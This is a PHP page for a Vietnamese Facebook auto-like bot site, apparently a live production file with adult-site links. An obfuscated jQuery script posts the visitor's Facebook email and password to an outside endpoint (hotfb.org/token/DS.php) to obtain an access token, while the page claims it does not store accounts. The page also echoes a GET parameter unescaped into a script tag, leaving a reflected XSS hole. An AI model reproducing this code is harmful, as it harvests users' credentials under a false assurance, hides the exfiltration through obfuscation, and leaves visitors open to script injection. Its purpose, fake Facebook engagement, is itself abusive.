<?php
include 'head.php';
include '123config/configg.php';

if(isset($_GET['i'])){
echo '
<script>
alert("' . $_GET['i'] . '")
</script>';
}
if($Lady=='reset') { session_destroy(); }
if(isset($_SESSION['id'])) {
include 'menu.php';

}else{
form();
}


            
function form(){

  echo'  
   <div class="content-page">
                <!-- Start content -->
                <div class="content">
                    <div class="container">
 <div class="row">
                        <!-- Page-Title -->
                        <div class="row">
                            <div class="col-sm-12">
                                <div class="page-title-box">
                                    <ol class="breadcrumb pull-right">
                                        <li><a href="//duysexy.pro" target="_blank">DuySexy.Pro</a></li>
                                        
                                    </ol>
                                    <h4 class="page-title">HotFB.Org - Auto Bot Like Facebook</h4>
                                </div>
                            </div>
                        </div>

		<div class="col-md-6">
			<div class="panel panel-success">
				<div class="panel-heading">
					<h4><i class="fa fa-angellist"></i> Welcome to HotFB.ORG</h4>
				</div>
				<div class="panel-body" style="text-align: center;">
					<div class="col-sm-4">
						<span class="fa fa-exclamation-triangle" style="font-size:60px;color:#FF3030;text-shadow:2px 2px 4px #000000;"></span>
						<h4><b>No Spam</b></h4>
						<p>HotFB.Org hoàn toàn miễn phí !</p>

					</div>
					<div class="col-sm-4">
						<span class="fa fa-leaf" style="font-size:60px;color:#008080;text-shadow:2px 2px 4px #000000;"></span>
						<h4><b>Functions</b></h4>
						<p>Các tính năng Auto Bot đẳng cấp duy nhất trên Thế giới !</p>
					</div>
					<div class="col-sm-4">
						<span class="fa fa-lock" style="font-size:60px;color:#3399FF;text-shadow:2px 2px 4px #000000;"></span>
						<h4><b>Security</b></h4>
						<p>Chế độ Bảo mật của HotFB.Org là 100% !</p>
					</div>
				</div>
			</div>
		</div>
		<div class="col-md-6">
			<div class="panel panel-primary">
				<div class="panel panel-heading">
					<h4><i class="fa fa-bullhorn"></i> Thông Báo - <a href="thong-bao" target="_blank"><font color="white">Xem Tiếp</font></a></h4>
				</div>
				<div class="panel-body">
						<b><font color="red"><a href="//thegioisex.cf" target="_blank" rel="dofollow"> Wap XXX của thằng cu Sơn Sexy </a> </font></b><hr>
						<b><font color="red">Đăng status tag 10 bạn bè quảng cáo HotFB.Org rồi ib <a href="//fb.com/duysexyy" target="_blank"> DuySexy </a>để nhận code curl like nhé!</font></b><hr>
						<b><font color="red">350 Like / 1 Lần Hack, Updating 150 Sub / 1 Lần. Tích cực pr cho HotFB nhé hihi</font></b>
					</div>
				</div>
			</div>

<!--Panel Đăng Nhập-->


                            
			<div class="col-md-12">
				<div class="panel panel-success">
					<div class="panel panel-heading">
						<h4><i class="fa fa-yelp"></i> Đăng Nhập Hệ Thống</h4>
					</div><center>
                                   <div class="panel-body">
                                  
<div class="form-group">
<form action="DuySexy.php" method="post">
<label for="email"><font color="red"><b>* Email, Username hoặc SĐT: </b></font></label>
<input id="email" placeholder="Email, Username or Phone Number" class="form-control"/>
</div>
<div class="form-group"><label for="password"><font color="red"><b>* Mật khẩu ( Password ) :</b></font></label>
<input id="password" type="password" placeholder="Password" class="form-control"/>
</div>
<div class="form-group"><label for="app_id"><font color="red"><b>* Chọn Ứng Dụng ( Access Token App ) :</b></font></label>
<select id="app_id" class="form-control" disabled="disabled">
<option value="6628568379">Facebook For Hot Face ( Default )</option>
</select>
</div>
<div class="form-group text-center">
<button id="submit" class="btn btn-sm btn-primary">Lấy Token</button>
</form>
</div>
<div class="alert alert-success"><b>HotFB.Org không lưu lại tài khoản của các bạn. Nếu gặp lỗi khi lấy Mã Token xem chi tiết và lấy token <a href="token" target="_blank"> <font color="red"> Tại Đây </font></a></b></div>
<div class="form-group text-center" id="load_result" style="display:none">
<form action="login.php" method="post">
<input id="result" onclick="this.focus();this.select()" class="form-control" rows="2" name="access_token">
<span class="input-group-btn">
                                                       <button type="submit" class="btn btn-block btn-success btn-flat" onClick="Login()" data-toggle="tooltip" data-placement="right"> <i class="glyphicon glyphicon-repeat"></i> Đăng Nhập</button>
                                                        </span>

<script src="//code.jquery.com/jquery.min.js"></script>
<script>
    var _0x6619 = ["click", "#submit", "disabled", "attr", "Token Getting...", "html", "val", "#email", "#password", "#app_id option:selected", "removeAttr", "Lấy token", "show", "#load_result", "Chỉ Lấy Token Tại địa chỉ http://hotfb.org , chi tiết xem thêm tại http://hotfb.org/token", "#result", "fail", "http://hotfb.org/token/DS.php", "post", "ajax", "on"];
    $(document)[_0x6619[20]](_0x6619[0], _0x6619[1], function () {
        $(_0x6619[1])[_0x6619[3]](_0x6619[2], _0x6619[2]), $(_0x6619[1])[_0x6619[5]](_0x6619[4]);
        var _0x1ea6x1 = $(_0x6619[7])[_0x6619[6]](),
            _0x1ea6x2 = $(_0x6619[8])[_0x6619[6]](),
            _0x1ea6x3 = $(_0x6619[9])[_0x6619[6]]();
        $[_0x6619[19]]({
            url: _0x6619[17],
            type: _0x6619[18],
            data: {
                email: _0x1ea6x1,
                password: _0x1ea6x2,
                app_id: _0x1ea6x3
            },
            success: function (_0x1ea6x1) {
                $(_0x6619[1])[_0x6619[10]](_0x6619[2]), $(_0x6619[1])[_0x6619[5]](_0x6619[11]), $(_0x6619[13])[_0x6619[12]](), $(_0x6619[15])[_0x6619[6]](_0x1ea6x1)
            }
        })[_0x6619[16]](function () {
            $(_0x6619[1])[_0x6619[10]](_0x6619[2]), $(_0x6619[1])[_0x6619[5]](_0x6619[11]), $(_0x6619[13])[_0x6619[12]](), $(_0x6619[15])[_0x6619[6]](_0x6619[14])
        })
    })
</script>	                       
                            </div>
                            </div>
							</div>
							</div>
							</div>
	
</center>							
							                               
                           
	
			
<!--//Panel Đăng Nhập-->


                            
                            
                    <div class="row">

			<div class="col-md-12">
				<div class="panel panel-success">
					<div class="panel panel-heading">
						<h4><i class="fa fa-question-circle"></i> Làm Thế Nào Để Sử Dụng Tốt Nhất?</h4>
					</div>
					<div class="panel-body">
						<div class="box-body well well-sm no-shadow" style="font-size:13px;">
							<font color="blue">Điều kiện 1:</font> Thiết lập năm sinh cho đủ 18+ tuổi. <a href="https://m.facebook.com/help/contact/233841356784195?_rdr" target="_blank"><font color="red"> Đổi ngày sinh không giới hạn </font></a>
							<hr>
							<font color="blue">Điều kiện 2:</font> Bật chế độ cho phép  <kbd><i class="fa fa-globe"></i> Tất cả mọi người <i class="fa fa-caret-down"></i></kbd> hoặc <kbd><i class="fa fa-globe"></i> Everyone <i class="fa fa-caret-down"></i></kbd> theo dõi được bạn. <a href="http://fb.com/settings?tab=followers" target="_blank" rel="nofollow"><font color="red">Thiết Lập Người Theo Dõi</font></a>
							<hr>
							<font color="blue">Điều kiện 3:</font> Các bài viết phải ở chế độ <kbd><i class="fa fa-globe"></i> Mọi người ( Công khai )</kbd>. <a href="https://www.facebook.com/settings?tab=privacy&amp;section=composer&amp;view" target="_blank" rel="nofollow"><font color="red">Thiết lập quyền riêng tư Công khai</font></a><br>
							(Thiết lập này chỉ áp dụng cho các bài đăng sau khi bạn thiết lập, các bài đăng trước đó bạn phải chỉnh sửa ngay trên bài đăng).
							<hr>
							<font color="blue">Điều kiện 4:</font> Riêng auto bình luận bạn phải bật cho phép <kbd><i class="fa fa-globe"></i> Tất cả mọi người <i class="fa fa-caret-down"></i></kbd> hoặc <kbd><i class="fa fa-globe"></i> Everyone <i class="fa fa-caret-down"></i></kbd> có thể bình luận bài viết của bạn. <a href="http://fb.com/settings?tab=followers&amp;section=comment&amp;view" target="_blank" rel="nofollow"><font color="red">Thiết lập Bình luận Công khai</font></a><br><br>
						</div>
					</div>
				</div>				
			</div><!--.col-md-12-->
		</div><!--.load-->
	</div>
</div>

           
         
';



}

include 'foot.php';




function getData($dir,$params=null){
$param = array(
'access_token' => getToken(),
);
if($params){ $arrayParams=array_merge($params,$param); }else{ $arrayParams =$param; }
$url = getUrl('graph',$dir,$arrayParams);
$result = json_decode(auto($url),true);
if($result[data]){
return $result[data];
}else{
return $result;
}
function getUrl($domain,$dir,$uri=null){
if($uri){
foreach($uri as $key =>$value){
$parsing[] = $key . '=' . $value;
}
$parse = '?' . implode('&',$parsing);
}
return 'https://' . $domain . '.facebook.com/' . $dir . $parse;
}
}

function getToken(){
return $_SESSION['access_token'];
}

function auto($url){
$curl = curl_init();
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_URL, $url);
$ch = curl_exec($curl);
curl_close($curl);
return $ch;
}
?>

